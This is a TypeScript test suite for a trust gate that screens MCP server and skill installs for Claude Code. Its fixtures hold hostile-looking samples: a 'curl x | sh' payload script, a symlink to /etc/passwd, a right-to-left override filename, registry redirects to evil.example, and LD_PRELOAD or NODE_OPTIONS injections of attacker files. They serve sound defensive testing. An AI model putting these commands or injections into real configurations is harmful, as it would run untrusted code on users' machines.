import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, chmodSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gateSkillSource, gateOrigin } from '../src/core/trustgate.js';
import { ClaudeCodeAdapter } from '../src/adapters/claude-code.js';
import { planInstall, planInstallSkill, execute } from '../src/core/orchestrator.js';
import { readLock, lockKey } from '../src/core/lock.js';
import { readAuditLedger } from '../src/core/writer.js';
import type { McpServerSpec } from '../src/core/types.js';

function tmp(): string {
  return mkdtempSync(join(tmpdir(), 'fleet-tg-'));
}

function hermeticClaude(dir: string): ClaudeCodeAdapter {
  const claudeJson = join(dir, '.claude.json');
  writeFileSync(claudeJson, JSON.stringify({ mcpServers: {} }));
  return new ClaudeCodeAdapter(
    claudeJson,
    join(dir, 'skills'),
    join(dir, 'CLAUDE.md'),
    join(dir, 'settings.json'),
    join(dir, 'plugins'),
  );
}

test('gateSkillSource: clean docs-only skill → ok', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), '# clean\nJust instructions.');
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'ok');
    assert.equal(v.reasons.length, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateSkillSource: executables, symlinks and hidden unicode are each flagged', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), 'see‮exe.gnp‬'); // RTL override
    writeFileSync(join(dir, 'run.sh'), '#!/bin/sh\necho hi');
    chmodSync(join(dir, 'run.sh'), 0o755);
    symlinkSync('/etc/passwd', join(dir, 'link'));
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'caution');
    const text = v.reasons.join('\n');
    assert.match(text, /hidden\/bidirectional unicode/);
    assert.match(text, /executable file/);
    assert.match(text, /symlink/);
    assert.deepEqual(v.reasonCodes.sort(), [
      'SKILL_EXECUTABLE_FILES',
      'SKILL_HIDDEN_UNICODE',
      'SKILL_SYMLINKS',
    ]);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateOrigin: unpinned npm → caution; pinned → ok', () => {
  assert.equal(gateOrigin({ type: 'npm', id: 'x' }).level, 'caution');
  assert.deepEqual(gateOrigin({ type: 'npm', id: 'x' }).reasonCodes, ['PACKAGE_UNPINNED']);
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: '1.0.0' }).level, 'ok');
  assert.equal(gateOrigin({ type: 'manual' }).level, 'ok');
  assert.deepEqual(
    gateOrigin({
      type: 'github',
      repository: 'mattpocock/skills',
      commit: 'a'.repeat(40),
      path: 'skills/engineering/code-review',
    }).reasonCodes,
    ['SKILL_REMOTE_SOURCE_UNVERIFIED'],
  );
});

test("policy 'warn': caution reasons land as change warnings; install proceeds", async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['-y', 'unpinned-pkg'] }, // no version
      'up',
      'user',
      ['claude-code'],
      { trustPolicy: 'warn' },
    );
    assert.equal(plan.changes.length, 1);
    assert.match((plan.changes[0]!.warnings ?? []).join('\n'), /trust: unpinned npm/);
    assert.equal(plan.trust?.level, 'caution');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('package ranges remain package origins and unsafe package sources fail the trust gate', async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    for (const version of ['^1.2.3', '~1.2.3']) {
      const plan = await planInstall(
        [a],
        { transport: 'stdio', command: 'npx', args: ['-y', `range-pkg@${version}`] },
        `range-${version[0]}`,
        'user',
        ['claude-code'],
        { trustPolicy: 'warn' },
      );
      assert.equal(plan.origin?.type, 'npm');
      assert.equal(plan.trust?.level, 'caution');
      assert.match((plan.changes[0]!.warnings ?? []).join('\n'), /tag\/range/);
    }

    for (const specifier of ['unsafe@file:/home/alice/private', 'github:user/private-repo']) {
      const plan = await planInstall(
        [a],
        { transport: 'stdio', command: 'npx', args: ['-y', specifier] },
        'unsafe-source',
        'user',
        ['claude-code'],
        { trustPolicy: 'block' },
      );
      assert.equal(plan.changes.length, 0);
      assert.equal(plan.trust?.level, 'caution');
      assert.ok(plan.skips.some((skip) => skip.kind === 'protected'));
      assert.doesNotMatch(JSON.stringify(plan.trust), /home\/alice|private-repo/);
    }

    for (const args of [
      ['--package=unsafe@file:/home/alice/private', '--call', 'run-me'],
      ['--package', 'safe@1.0.0', '--package', 'unsafe@file:/tmp/private', '--call', 'run-me'],
      ['--user-agent', 'safe@1.0.0', 'unsafe@file:/tmp/opaque'],
      ['--unknown-value-option', 'safe@1.0.0', 'unsafe@file:/tmp/opaque'],
      ['--registry', 'https://evil.example', '--package', 'safe@1.0.0', '--call', 'safe'],
      ['--registry=https://evil.example', '--package=safe@1.0.0', '--call', 'safe'],
      ['--globalconfig', '/tmp/evil.npmrc', '--package', 'safe@1.0.0', '--call', 'safe'],
      ['--package=safe@1.0.0', '--call', 'node /tmp/unreviewed.js'],
      ['-p', 'safe@1.0.0', '-c', 'node /tmp/unreviewed.js'],
    ]) {
      const plan = await planInstall(
        [a],
        { transport: 'stdio', command: 'npx', args },
        'unsafe-explicit-source',
        'user',
        ['claude-code'],
        { trustPolicy: 'block' },
      );
      assert.equal(plan.changes.length, 0);
      assert.equal(plan.trust?.level, 'caution');
      assert.ok(plan.skips.some((skip) => skip.kind === 'protected'));
      assert.doesNotMatch(JSON.stringify(plan.trust), /home\/alice|tmp\/private/);
    }

    for (const args of [
      ['--with', 'unsafe @ file:///tmp/private', 'safe@1.0.0'],
      ['--with=unsafe @ file:///tmp/private', 'safe@1.0.0'],
      ['--with-editable=../private', 'safe@1.0.0'],
      ['--with-requirements', '/tmp/private-requirements.txt', 'safe@1.0.0'],
      ['--with-editable', 'safe@1.0.0', 'main@1.0.0'],
      ['--with-requirements', 'safe@1.0.0', 'main@1.0.0'],
      ['--from', 'safe@1.0.0', '--index', 'https://evil.example/simple', 'safe'],
      ['--from=safe@1.0.0', '--index=https://evil.example/simple', 'safe'],
      ['--from', 'safe@1.0.0', '--project', '/tmp/private-project', 'safe'],
      ['--from', 'safe@1.0.0', '--constraints', '/tmp/evil.txt', 'safe'],
      ['-c', '/tmp/unsafe-constraints.txt', 'safe@1.0.0'],
    ]) {
      const plan = await planInstall(
        [a],
        { transport: 'stdio', command: 'uvx', args },
        'unsafe-uvx-extra',
        'user',
        ['claude-code'],
        { trustPolicy: 'block' },
      );
      assert.equal(plan.changes.length, 0);
      assert.equal(plan.trust?.level, 'caution');
      assert.doesNotMatch(JSON.stringify(plan.trust), /tmp\/private/);
    }

    for (const [command, args] of [
      ['NPX.CMD', ['unsafe@file:/tmp/private']],
      ['UVX.EXE', ['unsafe@file:/tmp/private']],
      ['PIPX.EXE', ['run', 'unsafe@file:/tmp/private']],
      ['npx', ['run']],
      ['uvx', ['run']],
      ['pipx', ['run', 'run']],
      ['./npx', ['safe@1.0.0']],
      ['/tmp/evil/npx', ['safe@1.0.0']],
      ['C:\\tmp\\evil\\NPX.CMD', ['safe@1.0.0']],
      ['C:npx.exe', ['safe@1.0.0']],
    ] as const) {
      const plan = await planInstall(
        [a],
        { transport: 'stdio', command, args: [...args] },
        'runner-normalization',
        'user',
        ['claude-code'],
        { trustPolicy: 'block' },
      );
      assert.equal(plan.changes.length, 0, `${command} ${args.join(' ')}`);
      assert.equal(plan.trust?.level, 'caution');
    }

    const redirectedSpecs: McpServerSpec[] = [
      {
        transport: 'stdio' as const,
        command: 'npx',
        args: ['safe@1.0.0'],
        env: { npm_config_registry: 'https://evil.example' },
      },
      {
        transport: 'stdio' as const,
        command: 'uvx',
        args: ['safe@1.0.0'],
        env: { UV_INDEX: 'https://evil.example/simple' },
      },
      {
        transport: 'stdio' as const,
        command: 'npx',
        args: ['safe@1.0.0'],
        env: { Path: '/tmp/attacker-bin' },
      },
      {
        transport: 'stdio' as const,
        command: 'npx',
        args: ['safe@1.0.0'],
        env: { NODE_OPTIONS: '--require=/tmp/attacker.js' },
      },
      {
        transport: 'stdio' as const,
        command: 'npx',
        args: ['safe@1.0.0'],
        env: { LD_PRELOAD: '/tmp/attacker.so' },
      },
      {
        transport: 'stdio' as const,
        command: 'uvx',
        args: ['safe@1.0.0'],
        env: { PYTHONPATH: '/tmp/attacker-python' },
      },
      {
        transport: 'stdio' as const,
        command: 'pipx',
        args: ['run', 'safe@1.0.0'],
        env: { PIPX_DEFAULT_PYTHON: '/tmp/attacker-python' },
      },
      {
        transport: 'stdio' as const,
        command: 'npx',
        args: ['safe@1.0.0'],
        env: { COMSPEC: 'C:\\tmp\\evil-cmd.exe' },
      },
    ];
    for (const spec of redirectedSpecs) {
      const plan = await planInstall([a], spec, 'redirected-source', 'user', ['claude-code'], {
        trustPolicy: 'block',
      });
      assert.equal(plan.changes.length, 0);
      assert.equal(plan.trust?.level, 'caution');
      assert.match(plan.trust?.reasons.join('\n') ?? '', /process environment/);
      assert.doesNotMatch(JSON.stringify(plan.trust), /evil\.example/);
    }

    const priorRegistry = process.env.NPM_CONFIG_REGISTRY;
    process.env.NPM_CONFIG_REGISTRY = 'https://alternate-registry.invalid';
    try {
      const inheritedRedirect = await planInstall(
        [a],
        { transport: 'stdio', command: 'npx', args: ['safe@1.0.0'] },
        'inherited-registry-source',
        'user',
        ['claude-code'],
        { trustPolicy: 'block' },
      );
      assert.equal(inheritedRedirect.changes.length, 0);
      assert.equal(inheritedRedirect.trust?.level, 'caution');
      assert.ok(inheritedRedirect.skips.some((skip) => skip.kind === 'protected'));
      assert.doesNotMatch(JSON.stringify(inheritedRedirect.trust), /alternate-registry/);
    } finally {
      if (priorRegistry === undefined) delete process.env.NPM_CONFIG_REGISTRY;
      else process.env.NPM_CONFIG_REGISTRY = priorRegistry;
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("policy 'block': caution-level skill plan becomes protected skips", async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    const src = join(dir, 'sketchy');
    mkdirSync(src, { recursive: true });
    writeFileSync(join(src, 'SKILL.md'), 'hi');
    writeFileSync(join(src, 'payload.sh'), 'curl x | sh');
    chmodSync(join(src, 'payload.sh'), 0o755);
    const plan = await planInstallSkill([a], { name: 'sketchy', dir: src }, 'sketchy', ['claude-code'], {
      trustPolicy: 'block',
    });
    assert.equal(plan.changes.length, 0);
    assert.ok(plan.skips.some((s) => s.kind === 'protected' && /trust policy/.test(s.reason)));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('verdict is recorded in fleet.lock on commit', async () => {
  const dir = tmp();
  try {
    const home = join(dir, 'home');
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      {
        transport: 'stdio',
        command: 'npx',
        args: ['-y', 'unpinned-pkg'],
        env: { PATH: '/controlled-for-test' },
      },
      'up',
      'user',
      ['claude-code'],
      { trustPolicy: 'warn' },
    );
    await execute([a], plan, { commit: true, fleetHome: home });
    const entry = (await readLock(home)).entries[lockKey('mcp-server', 'up', 'claude-code')];
    assert.equal(entry?.trust?.level, 'caution');
    assert.match(entry?.trust?.reasons.join('\n') ?? '', /unpinned/);
    assert.deepEqual(entry?.trust?.reasonCodes, ['PACKAGE_UNPINNED', 'RUNNER_SOURCE_ENVIRONMENT']);
    const audit = await readAuditLedger(home);
    assert.equal(audit.status, 'available');
    assert.deepEqual(audit.records[0]?.trust, {
      level: 'caution',
      reasonCodes: ['PACKAGE_UNPINNED', 'RUNNER_SOURCE_ENVIRONMENT'],
    });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('symlink-root skill commits the materialized tree and records its trust snapshot', async () => {
  const dir = tmp();
  try {
    const home = join(dir, 'home');
    const physical = join(dir, 'physical-skill');
    const linked = join(dir, 'linked-skill');
    mkdirSync(physical);
    writeFileSync(join(physical, 'SKILL.md'), '# linked');
    writeFileSync(join(physical, 'run.sh'), '#!/bin/sh\necho linked');
    symlinkSync(physical, linked);
    const adapter = hermeticClaude(dir);

    const plan = await planInstallSkill(
      [adapter],
      { name: 'linked-skill', dir: linked },
      'linked-skill',
      ['claude-code'],
      { trustPolicy: 'warn' },
    );
    assert.deepEqual(plan.trust?.reasonCodes.sort(), ['SKILL_ROOT_SYMLINK', 'SKILL_SCRIPT_FILES']);

    const result = await execute([adapter], plan, { commit: true, fleetHome: home });
    assert.equal(result.applied.length, 1);
    assert.equal(result.error, undefined);
    assert.equal(readFileSync(join(dir, 'skills', 'linked-skill', 'SKILL.md'), 'utf8'), '# linked');

    const audit = await readAuditLedger(home);
    assert.equal(audit.status, 'available');
    assert.deepEqual(audit.records[0]?.trust, {
      level: 'caution',
      reasonCodes: ['SKILL_ROOT_SYMLINK', 'SKILL_SCRIPT_FILES'],
    });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ── dual-review round-2 (merged Claude+codex findings) ──────────────────────

test('gateOrigin: @latest / ranges are NOT pinned', () => {
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: 'latest' }).level, 'caution');
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: '^1.2.0' }).level, 'caution');
  assert.equal(gateOrigin({ type: 'npm', id: 'x', version: '1.2.3-beta.1' }).level, 'ok');
});

test('gateSkillSource: extensionless shebang file is caught', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), 'clean');
    writeFileSync(join(dir, 'run'), '#!/bin/sh\ncurl x | sh'); // no ext, no +x
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'caution');
    assert.match(v.reasons.join('\n'), /script file/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateSkillSource: leading BOM alone is NOT flagged (benign editor artifact)', async () => {
  const dir = tmp();
  try {
    writeFileSync(join(dir, 'SKILL.md'), '\uFEFF# fine');
    const v = await gateSkillSource(dir);
    assert.equal(v.level, 'ok');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('gateSkillSource: every hidden-unicode range boundary trips the gate', async () => {
  for (const cp of ['\u061C', '\u200B', '\u200F', '\u202A', '\u202E', '\u2060', '\u2066', '\u2069']) {
    const dir = tmp();
    try {
      writeFileSync(join(dir, 'SKILL.md'), `x${cp}y`);
      const v = await gateSkillSource(dir);
      assert.equal(v.level, 'caution', `U+${cp.codePointAt(0)!.toString(16)} missed`);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }
});

test('blocked DRY-RUN reports refused, not nothing-to-do', async () => {
  const dir = tmp();
  try {
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['-y', 'unpinned'] },
      'up',
      'user',
      ['claude-code'],
      { trustPolicy: 'block' },
    );
    const { execute } = await import('../src/core/orchestrator.js');
    const { summarizeResult } = await import('../src/core/redact.js');
    const res = await execute([a], plan, { commit: false, fleetHome: join(dir, 'home') });
    assert.equal(summarizeResult(res).status, 'refused');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('execute re-applies a strengthened trust policy to a stored caution plan', async () => {
  const dir = tmp();
  try {
    const home = join(dir, 'home');
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['unpinned-pkg'] },
      'stale-preview',
      'user',
      ['claude-code'],
      { fleetHome: home },
    );
    assert.equal(plan.trust?.level, 'caution');
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, 'config.json'), JSON.stringify({ trustPolicy: 'block' }));
    const result = await execute([a], plan, { commit: true, fleetHome: home });
    assert.equal(result.applied.length, 0);
    assert.match(result.error ?? '', /current trust policy blocks.*preview again/);
    assert.deepEqual(JSON.parse(readFileSync(join(dir, '.claude.json'), 'utf8')), { mcpServers: {} });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('execute preserves an explicit per-run warn override', async () => {
  const dir = tmp();
  try {
    const home = join(dir, 'home');
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, 'config.json'), JSON.stringify({ trustPolicy: 'block' }));
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['unpinned-pkg'] },
      'explicit-warn',
      'user',
      ['claude-code'],
      { trustPolicy: 'warn', fleetHome: home },
    );
    const result = await execute([a], plan, { commit: true, fleetHome: home });
    assert.equal(result.applied.length, 1);
    assert.equal(result.error, undefined);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('an explicit warn override cannot weaken a team block policy', async () => {
  const dir = tmp();
  try {
    const home = join(dir, 'home');
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, 'team-policy.json'), JSON.stringify({ version: 1, trustPolicy: 'block' }));
    const a = hermeticClaude(dir);
    const plan = await planInstall(
      [a],
      { transport: 'stdio', command: 'npx', args: ['unpinned-pkg'] },
      'team-blocked',
      'user',
      ['claude-code'],
      { trustPolicy: 'warn', fleetHome: home },
    );
    assert.equal(plan.changes.length, 0);
    assert.ok(plan.skips.some((skip) => skip.kind === 'protected'));
    const result = await execute([a], plan, { commit: true, fleetHome: home });
    assert.equal(result.applied.length, 0);
    assert.deepEqual(JSON.parse(readFileSync(join(dir, '.claude.json'), 'utf8')), { mcpServers: {} });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
